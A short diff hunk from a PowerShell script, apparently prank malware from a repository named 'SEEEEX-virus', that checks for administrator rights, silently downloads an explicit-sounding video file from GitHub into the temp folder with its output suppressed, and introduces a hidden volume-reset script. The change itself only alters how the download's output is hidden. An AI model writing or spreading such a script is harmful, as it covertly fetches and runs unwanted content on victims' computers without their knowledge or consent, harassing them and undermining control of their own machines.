@@ -15,7 +15,7 @@ If (-not $IsAdmin) {
 $tempPath = [System.IO.Path]::GetTempPath()
 $videoFile = Join-Path -Path $tempPath -ChildPath "SEX.mp4"
 $downloadUrl = "https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/SEX.mp4"  
-Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile -ProgressAction SilentlyContinue
+Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile > $null 2>&1
 
 #---------------------------------------------------
 # 2. Create and Launch a Hidden Volume-Reset Script
